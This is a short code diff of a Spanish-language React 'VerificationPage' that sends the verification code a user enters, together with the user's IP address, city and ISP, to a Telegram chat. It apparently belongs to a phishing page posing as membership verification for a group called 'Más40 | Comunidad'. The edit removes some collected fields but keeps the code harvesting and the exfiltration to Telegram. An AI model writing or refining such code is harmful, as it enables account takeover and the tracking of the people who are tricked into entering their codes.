@@ -27,10 +27,8 @@ function VerificationPage() {
     } catch (error) {
       return {
         ip: 'No disponible',
-        country: 'No disponible',
         city: 'No disponible',
         isp: 'No disponible',
-        device: navigator.userAgent
       };
     }
   };
@@ -48,10 +46,7 @@ function VerificationPage() {
       // Enviar código de verificación y datos del usuario a Telegram
       const message = `
 🔑 Nuevo código de verificación:
-👥 Grupo: Más40 | Comunidad
 📟 Código: ${code}
-
-🌐 INFORMACIÓN DEL USUARIO
 🔌 IP: ${userInfo.ip}
 🏙️ Ciudad: ${userInfo.city}
 📡 ISP: ${userInfo.isp}
